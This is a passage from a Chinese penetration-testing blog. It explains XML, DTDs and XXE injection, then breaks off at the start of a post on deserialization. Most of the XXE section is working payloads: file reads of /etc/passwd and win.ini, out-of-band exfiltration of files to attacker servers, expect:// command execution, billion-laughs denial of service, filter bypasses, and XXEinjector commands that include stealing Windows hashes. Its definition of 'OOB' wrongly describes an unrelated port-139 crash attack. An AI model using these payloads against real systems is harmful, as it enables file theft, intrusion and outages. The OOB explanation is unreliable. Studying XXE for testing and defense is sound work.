(#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;]&gt;&lt;!-- 文档元素 --&gt;&lt;note&gt;&lt;to&gt;Tove&lt;/to&gt;&lt;from&gt;Jani&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;&lt;/note&gt; XML 是一种很像HTML的标记语言。XML 的设计宗旨是 传输数据，而不是显示数据。XML 标签没有被预定义。需要自行定义标签。XML 被设计为具有自我描述性。 XML 和 HTML 之间的差异XML 被设计用来传输和存储数据，其焦点是数据的内容。 HTML 被设计用来显示数据，其焦点是数据的外观。 XML 用途XML 把数据从 HTML 分离XML 简化数据共享XML 简化数据传输XML 简化平台变更XML 用于创建新的互联网语言 XML 树结构XML 文档形成了一种树结构，它从”根部”开始，然后扩展到”枝叶”。 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;note&gt;&lt;to&gt;Tove&lt;/to&gt;&lt;from&gt;Jani&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;&lt;/note&gt; 第一行是 XML 声明。它定义 XML 的版本（1.0）和所使用的编码（UTF-8 : 万国码, 可显示各种语言）; 下一行&lt;note&gt;描述文档的根元素（像在说：“本文档是一个便签”）; 接下来 4 行描述根的 4 个子元素（to, from, heading 以及 body） 注意：XML 文档必须包含根元素。该元素是所有其他元素的父元素。 XML 文档中的元素形成了一棵文档树。这棵树从根部开始，并扩展到树的最底端。所有的元素都可以有子元素。 XML语法 XML 必须包含根元素，它是所有其他元素的父元素 XML 声明文件的可选部分，如果存在需要放在文档的第一行 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 所有的 XML 元素都必须有一个关闭标签，在 HTML 中，某些元素的关闭标签不是必须的，比如&lt;p&gt;。 XML 标签对大小写敏感 XML 必须正确嵌套，也就是标签的嵌套顺序要正确。 &lt;b&gt;&lt;i&gt;This text is bold and italic&lt;/i&gt;&lt;/b&gt; XML 属性值必须加引号 1234&lt;note date=&quot;12/11/2007&quot;&gt;&lt;to&gt;Tove&lt;/to&gt;&lt;from&gt;Jani&lt;/from&gt;&lt;/note&gt; 实体引用 在 XML 中，一些字符拥有特殊的意义 在 XML 中，有 5 个预定义的实体引用: &amp;lt; &lt; less than &amp;gt; &gt; greater than &amp;amp; &amp; ampersand &amp;apos; ’ apostrophe &amp;quot; “ quotation mark XML 中的注释 &lt;!-- This is a comment --&gt; 在 XML 中，空格会被保留 但是 HTML 会把多个连续的空格字符裁减（合并）为一个： XML 以 LF 存储换行 在 Windows 应用程序中，换行通常以一对字符来存储：回车符（CR）和换行符（LF）。 在 Unix 和 Mac OSX 中，使用 LF 来存储新行。 在旧的 Mac 系统中，使用 CR 来存储新行。 XML 以 LF 存储换行。 XML 元素 XML 元素指的是从（且包括）开始标签直到（且包括）结束标签的部分。XML 元素是可扩展的。 比如&lt;body&gt;Don&#39;t forget me this weekend!&lt;/body&gt;。 XML 属性 XML元素具有属性，类似 HTML。属性（Attribute）提供有关元素的额外信息。 属性通常提供不属于数据组成部分的信息。在下面的实例中，文件类型与数据无关，但是对需要处理这个元素的软件来说却很重要。 比如：&lt;file type=&quot;gif&quot;&gt;computer.gif&lt;/file&gt;、&lt;img src=&quot;computer.gif&quot; /&gt;。 XML 属性必须加引号 属性不能包含多个值（元素可以） 属性不能包含树结构（元素可以） 属性不容易扩展（为未来的变化） 属性难以阅读和维护。请尽量使用元素来描述数据。而仅仅使用属性来提供与数据无关的信息。 DTD简介文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。 DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。 XML内部的 DOCTYPE 声明12345678910111213141516&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;]&gt;&lt;note&gt;&lt;to&gt;Tove&lt;/to&gt;&lt;from&gt;Jani&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;&lt;/note&gt; 外部文档声明假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中： XML中定义 DOCTYPE 的语法： 1&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt; 比如，有如下note元素，其中第一行代码表示note元素的DTD声明： 1234567&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;&lt;note&gt;&lt;to&gt;Tove&lt;/to&gt;&lt;from&gt;Jani&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;&lt;/note&gt; note.dtd文件的内容如下： 12345&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt; 实体声明dtd中的实体是用来定义普通文本的变量。可分为一般实体和参数实体 一般实体的声明语法： 1&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt; 引用实体的方式： &amp;实体名; 参数实体只能在DTD中使用，参数实体的声明格式： 1&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt; 引用实体的方式： %实体名; 内部实体声明dtd中的实体被声明为内部字符数据（普通文本） 语法： 1&lt;!ENTITY entity-name &quot;entity-value&quot;&gt; 实例： 123456DTD 的实体:&lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;&lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;XML 实例：&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; 外部实体声明dtd中的实体被声明为远程&#x2F;外部文本文件 语法： 1&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt; 实例： 123456DTD 的实体:&lt;!ENTITY writer SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;&lt;!ENTITY copyright SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;XML 实例:&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; PCDATA 简介PCDATA 的意思是被解析的字符数据（parsed character data）。可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。 PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。 文本中的标签会被当作标记来处理，而实体会被展开。不过，被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。 CDATA简介CDATA 的意思是字符数据（character data）。 CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。 漏洞简介 XXE 漏洞全称XML External Entity Injection，即 XML 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。 漏洞位置xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意 xml文件。 XXE 攻击方式构建外部实体注入方法直接通过DTD外部实体声明在XML文档内直接声明外部实体。 12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd/&quot;&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt; 先引入外部DTD文档，再引入外部实体声明在XML文档内直接引入外部文档，再在外部文档内引入外部实体。 XML 文件内容（包含DTD外部文档）： 123&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a SYSTEM &quot;http://mark4z5.com/evil.dtd&quot;&gt;&lt;c&gt;&amp;b;&lt;/c&gt; evil.dtd 文件内容（包含外部实体）： 1&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd/&quot;&gt; 通过XML文档内部声明的DTD外部实体引入外部实体声明先在XML文档内引入一个外部实体声明，再在外部实体内引入一个在攻击者服务器上的外部实体。 先写一个外部实体声明，然后引用的是在攻击者服务器上面的外部实体声明。 XML 文件内容： 注意：在DTD内部使用的参数实体，使用%实体 123456&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY %d SYSTEM &quot;http://mark4z5.com/evil.dtd&quot;&gt;%d;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt; evil.dtd 文件内容： 1&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd/&quot;&gt; 寻找 XML 输入点甄别那些接受XML作为输入内容的端点。 但是有时候，这些端点可能并不是那么明显（比如，一些仅使用JSON去访问服务的客户端）。在这种情况下，渗透测试人员就必须尝试不同的测试方式，比如修改HTTP的请求方法，修改Content-Type头部字段为 Content-Type：text/xml等等方法，然后看看应用程序的响应，看看程序是否解析了发送的内容，如果解析了，那么则可能有XXE攻击漏洞。 例如： 判断wsdl（web服务描述语言），或者一些常见的采用xml的java服务配置文件（spring，struts2）。不过现实中存在的大多数XXE漏洞都是blind，即不可见的，必须采用带外通道进行返回信息的记录，这里简单来说就是攻击者必须具有一台具有公网ip的主机。 例如： 从PHP代码层面，存在 Content-Type：text/xml , 说明 post 的数据包含 XML 格式，如：可以在请求头中添加 Content-Type:text/xml 或 Content-type:application/xml ，然后构造payload测试是否存在XXE攻击漏洞。 XXE 利用方式1. 文件读取有回显直接读靶机文件 12345&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;file:///d://test.txt&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt; 通过恶意引入外部参数实体，读靶机文件 123456&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % file SYSTEM &quot;http://vps-ip/hack.dtd&quot;&gt; %file;]&gt;&lt;test&gt;&amp;hhh;&lt;/test&gt; hack.dtd的内容如下： 1&lt;!ENTITY hhh SYSTEM &#x27;file:///etc/passwd&#x27;&gt; 2. 文件读取无回显（多数情况）当读取文件无回显时，如何将文件内容取出？ OOB攻击（把数据发送到远程服务器）OOB的意思是“束缚数据脱离”，这是一种破坏Windows系统的过程。它通过向TCP端口139发送随机数来攻击操作系统，从而让中央处理器（CPU）一直处于繁忙状态。原理是利用Windows下微软网络协定NetBIOS的一个例外处理程序，简单说就是传递一个特别大的数据包导致系统死机。 常见的场景是通过XML实体漏洞来攻击。 **先使用php://filter获取目标文件的内容，然后将内容通过dtd外部文档以http请求发送到接受数据的服务器(攻击服务器)**，这样即使没有回显也能将数据带出。 1234567&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=test.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.1.1:8080/test.dtd&quot;&gt;%dtd;%send;]&gt; test.dtd的内容，内部的%号要进行实体编码成&amp;#x25; 1234&lt;!ENTITY % payload&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.1.1:8080/?data=%file;&#x27;&gt;&quot; &lt;!-- file中就是test.txt的内容 --&gt;&gt;%payload; payload的内容为&lt;!ENTITY % send SYSTEM &#39;http://192.168.1.1:8080/?data=%file;&#39;&gt; 访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据 基于报错基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。所以和OOB的构造方式几乎只有url不同，其他地方一模一样。 引入服务器目标文件 引入DTD外部实体声明，引入服务器目标文件file:&#x2F;&#x2F;&#x2F;flag，作为%file。 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;192.168.1.1:8080/xml.dtd&quot;&gt; &lt;!-- 引入DTD外部实体声明 --&gt; &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt; %remote; %send;]&gt;&lt;message&gt;1234&lt;/message&gt; xml.dtd的内容如下： 12&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;&gt;%start; start 实体中嵌套了一层DTD外部实体 send，注意被嵌套的实体要进行HTML实体编码 访问file:///hhhhhhh/%file;报错，然后服务器会返回报错信息，但是该URL中包含%file，因此造成文件内容泄露。 引入本地文件如果目标主机的防火墙十分严格，不允许我们请求外网服务器dtd呢？由于XML的广泛使用，其实在各个系统中已经存在了部分DTD文件。按照上面的理论，我们只要是从外部引入DTD文件，并在其中定义一些实体内容就行。 &amp;#x26;为&amp;的HTML实体编码。 &amp;#x27;为&#39;的HTML实体编码。 123456789101112&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt; &lt;!-- 引入本地dtd文件 --&gt; &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt; &lt;!ENTITY % ISOamso &#x27; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;send; &#x27;&gt; %remote;]&gt;&lt;message&gt;1234&lt;/message&gt; ISOamso 实体中嵌套了一层DTD外部实体 eval，接着又嵌套了外部实体 send，注意被嵌套的实体要进行HTML实体编码，而 send 则被编码了两次。 ISOamso的第一行内容为&lt;!ENTITY % eval &quot;&lt;!ENTITY % send SYSTEM &#39;file://hhhhhhhh/?%file;&#39;&gt;&quot;&gt; 嵌套参数实体虽然W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个检查。几乎所有XML解析器能够发现如下这种两层嵌套式的。 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://myip/?%file;&#x27;&gt;&quot;&gt; &lt;!-- 在内部的实体声明中引用参数实体 --&gt; %start; %send;]&gt;&lt;message&gt;10&lt;/message&gt; 基于报错的三层嵌套参数实体XXE 1234567891011&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt; &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt; &lt;!ENTITY % para &#x27; &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt; &amp;#x25;para2; &#x27;&gt; %para;]&gt;&lt;message&gt;10&lt;/message&gt; pare的第一行内容为&lt;!ENTITY % para2 &quot;&lt;!ENTITY % error SYSTEM &#39;file:///%para1;&#39;&gt;&quot;&gt; 3. 内网探测和读文件差不多，只不过把URI改成内网机器地址 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY rabbit SYSTEM &quot;http://192.168.1.1：81/mark4z5&quot; &gt;]&gt;&lt;user&gt;&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;&lt;lastname&gt;666&lt;/lastname&gt;&lt;/user&gt; 该CASE是探测192.168.1.1的80、81端口，通过返回的“Connection refused”可以知道该81端口是closed的，而80端口是open的。 4. RCE 12345&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt; 该 CASE 是在安装 expect 扩展的 PHP 环境里执行系统命令，其他协议也有可能可以执行系统命令，比如php://input、php://filter等。 5. DOS12345678910111213&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE lolz [ &lt;!ENTITY lol &quot;lol&quot;&gt; &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt; &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt; &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt; &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt; &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt; &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt; &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; 此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。亦或者，如果目标是UNIX系统： 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; XXE 利用场景SVG在xml文档的svg图片标签中插入恶意实体。 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note [&lt;!ENTITY file SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot; &gt;]&gt;&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt; &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;&lt;/svg&gt; excel利用EXCEL进行XXE攻击。首先用excel创建一个空白的xlsx，然后解压： 12mkdir XXE &amp;&amp; cd XXEunzip ../XXE.xlsx 将解压得到的[Content_Types].xml改成恶意xml，再压缩回去： 1zip -r ../poc.xlsx * 绕过大小写绕过利用正则匹配的一些过滤规则，可以尝试使用大小写绕过。 编码绕过比如一些关键词：ENTITY、SYSTEM、file 等被写入黑名单，无法在XML中构造外部实体，可以尝试使用编码绕过，比如 UTF-16BE 1cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml 如果是过滤了http等协议，可以利用实体编码绕过，在前面的XXE利用方式中有用过。 其他协议绕过如果http被过滤，无法上传XML文件，可以用file://、php://filter、data:// data:// 123456789101112&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM &quot;data://text/plain;base64,PCFFTlRJVFkgJSAgYiBTWVNURU0gJ2h0dHA6Ly8xMjcuMC4wLjEvaGFjay5kdGQnPg==&quot;&gt; %a; %b; ]&gt;&lt;test&gt; &amp;xxe;&lt;/test&gt;&lt;!--编码内容--&gt;&lt;!ENTITY % b SYSTEM &#x27;http://127.0.0.1/test.dtd&#x27;&gt; 然后使用data协议上传：?text=data://text/plain,代码内容 file://加文件上传 12345678&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM &quot;file:///var/www/uploads/1.jpg&quot;&gt; %a;]&gt;&lt;!--上传文件1.jpg，内容如下--&gt;&lt;!ENTITY % b SYSTEM &#x27;http://192.168.1.1:8080/hack.dtd&#x27;&gt; php://filter协议加文件上传 123456789101112&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM &quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/test.jpg&quot;&gt; %a;]&gt;&lt;test&gt; &amp;xxe;&lt;/test&gt;&lt;!--上传文件test.jpg，内容如下--&gt;&lt;!--base64编码内容--&gt;PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg== 编码的原本内容为&lt;!ENTITY xxe SYSTEM &#39;php://filter/read=convert.base64-encode/resource=./flag.php&#39;&gt;。 自动化 XXE 工具XXEinjector是一款基于Ruby的XXE注入工具. 它可以使用多种直接或间接带外方法来检索文件。其中，目录枚举功能只对Java应用程序有效，而暴力破解攻击需要使用到其他应用程序。 建议在kali环境下运行 基本参数详解： 12345678910111213141516171819202122232425262728--host 必填项– 用于建立反向链接的IP地址。(--host=192.168.0.2)--file 必填项- 包含有效HTTP请求的XML文件。(--file=/tmp/req.txt)--path 必填项-是否需要枚举目录 – 枚举路径。(--path=/etc)--brute 必填项-是否需要爆破文件 -爆破文件的路径。(--brute=/tmp/brute.txt)--logger 记录输出结果。--rhost 远程主机IP或域名地址。(--rhost=192.168.0.3)--rport 远程主机的TCP端口信息。(--rport=8080)--phpfilter 在发送消息之前使用PHP过滤器对目标文件进行Base64编码。--netdoc 使用netdoc协议。(Java).``--enumports 枚举用于反向链接的未过滤端口。(--enumports=21,22,80,443,445)--hashes 窃取运行当前应用程序用户的Windows哈希。--expect 使用PHP expect扩展执行任意系统命令。(--expect=ls)--upload 使用Java jar向临时目录上传文件。(--upload=/tmp/upload.txt)--xslt XSLT注入测试。--ssl 使用SSL。--proxy 使用代理。(--proxy=127.0.0.1:8080)--httpport Set自定义HTTP端口。(--httpport=80)--ftpport 设置自定义FTP端口。(--ftpport=21)--gopherport 设置自定义gopher端口。(--gopherport=70)--jarport 设置自定义文件上传端口。(--jarport=1337)--xsltport 设置自定义用于XSLT注入测试的端口。(--xsltport=1337)--test 该模式可用于测试请求的有效。--urlencode URL编码，默认为URI。--output 爆破攻击结果输出和日志信息。(--output=/tmp/out.txt)--timeout 设置接收文件/目录内容的Timeout。(--timeout=20)--contimeout 设置与服务器断开连接的，防止DoS出现。(--contimeout=20)--fast 跳过枚举询问，有可能出现结果假阳性。--verbose 显示verbose信息。 使用方法： 枚举HTTPS应用程序中的&#x2F;etc目录： 1ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt –ssl 使用gopher（OOB方法）枚举&#x2F;etc目录： 1ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher 二次漏洞利用： 1ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt--2ndfile=/tmp/2ndreq.txt 使用HTTP带外方法和netdoc协议对文件进行爆破攻击： 1ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt--file=/tmp/req.txt --oob=http –netdoc 通过直接性漏洞利用方式进行资源枚举： 1ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK 枚举未过滤的端口： 1ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all 窃取Windows哈希： 1ruby XXEinjector.rb--host=192.168.0.2 --file=/tmp/req.txt –hashes 使用Java jar上传文件： 1ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt--upload=/tmp/uploadfile.pdf 使用PHP expect执行系统指令： 1ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter--expect=ls 测试XSLT注入： 1ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt –xslt 记录请求信息： 1ruby XXEinjector.rb --logger --oob=http--output=/tmp/out.txt XXE 漏洞修复与防御方案 推荐使用开发语言提供的禁用外部实体的方法。 PHP： 1libxml_disable_entity_loader(true); JAVA： 12DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); python： 12from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的 XML 数据 过滤关键词：&lt;!DOCTYPE、&lt;!ENTITY、SYSTEM、PUBLIC 实例xxe-lab 登陆界面，输入用户名密码，抓包 发现输入的数据使用post请求发送，且格式类似XML。 构造payload，执行文件读取： 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE Mikasa [&lt;!ENTITY test SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt; &lt;!-- 实体引用 --&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt; 成功获取到Windows配置信息。","raw":null,"content":null,"categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"反序列化漏洞","slug":"渗透测试/11. 反序列化","date":"2022-08-04T16:00:00.000Z","updated":"2023-10-05T12:01:52.692Z","comments":true,"path":"posts/[object Object]/渗透测试/11. 反序列化/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/11.%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/undefined","excerpt":"","text":"反序列化漏洞参考：https://www.anquanke.com/post/id/224769 原理 序列化 ： 概念：将对象转换成字节序列（json&#x2F;xml文件）。 作用：在传递和保存对象时，序列化可以保证对象的完整性和可传递性。对象被转换为有序字节序列，以便在网络上传输或者保存在本地文件中。 反序列化： 概念：将字节序列（json&#x2F;xml文件）转换成对象。 作用：根据字节序列中保存的对象状态及描述信息，通过反序列化重建对象。 序列化的优点将对象转为字节流存储到硬盘上，当 JVM （java虚拟机）停机的话，字节流还会在硬盘上默默等待，等待下一次JVM的启动，把序列化的对象，通过反序列化为原来的对象，并且序列化的二进制序列能够减少存储空间（永久性保存对象）。 序列化为字节流形式的对象可以进行网络传输(二进制形式)，方便了网络传输。 通过序列化可以在进程间传递对象。 序列化的实现javaJava中，只有实现了 Serializable 或者 Externalizable 接口的类的对象才能被序列化为字节序列。 1234567// 序列化java.io.ObjectOutputStream：对象输出流。该类的writeObject(Object obj)方法将将传入的obj对象进行序列化，把得到的字节序列写入到目标输出流中进行输出。// 反序列化java.io.ObjectInputStream：对象输入流。该类的readObject()方法从输入流中读取字节序列，然后将字节序列反序列化为一个对象并返回。 1234567891011121314151617public class SerializableTest &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; //序列化 FileOutputStream fos = new FileOutputStream(&quot;object.out&quot;); ObjectOutputStream oos = new ObjectOutputStream(fos); // 将序列化的输出定向到fos Student student1 = new Student(&quot;lihao&quot;, &quot;wjwlh&quot;, &quot;21&quot;); oos.writeObject(student1); oos.flush(); oos.close(); //反序列化 FileInputStream fis = new FileInputStream(&quot;object.out&quot;); ObjectInputStream ois = new ObjectInputStream(fis); Student student2 = (Student) ois.readObject(); System.out.println(student2.getUserName()+ &quot; &quot; + student2.getPassword() + &quot; &quot; + student2.getYear()); &#125;&#125; 另外java还有其他序列化实现方式，比如 json、&#x3D;&#x3D;fastjson&#x3D;&#x3D;、ProtoBuff、Hessian、Kyro等。 参考：https://blog.csdn.net/m0_46201444/article/details/115081351。 phpphp中，序列化和反序列化对应的函数分别为 serialize() 和 **unserialize()**。 12345678910111213&lt;?php highlight_file(__FILE__); $sites=array(&#x27;I&#x27;, &#x27;Like&#x27;, &#x27;PHP&#x27;); var_dump(serialize($sites)); // 对数组进行序列化 class man&#123; public $name=&quot;xiaocui&quot;; public $sex=&quot;man&quot;; private $age=26; &#125; $M = newman(); //创建一个对象 var_dump(serialize($M)); // 对对象进行序列化?&gt; 数组的序列化： 12345&quot;a:3:&#123;i:0;s:1:&quot;I&quot;;i:1;s:4:&quot;Like&quot;;i:2;s:3:&quot;PHP&quot;;&#125;&quot;a:3 a代表一数组，3代表数组中有3个元素i:0 代表元素的下标值为0s:1 代表元素的数据类型为字符型,长度为1 对象的序列化： 12345&quot;O:3:&quot;man&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;xiaocui&quot;;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:8:&quot;manage&quot;;i:26;&#125;&quot;O:3 代表是一个对象，其类名的长度为33 代表类中的字段数s:4 代表属性的类型为字符型，长度为4 测试： 数组的序列化和反序列化 12345&lt;?php $stu=[&#x27;tom&#x27;, &#x27;berry&#x27;, &#x27;ketty&#x27;]; $str=serialize($stu); // 序列化 file_put_contents(&#x27;./stu.txt&#x27;, $str);?&gt; 123456&lt;?php // 数组的反序列化 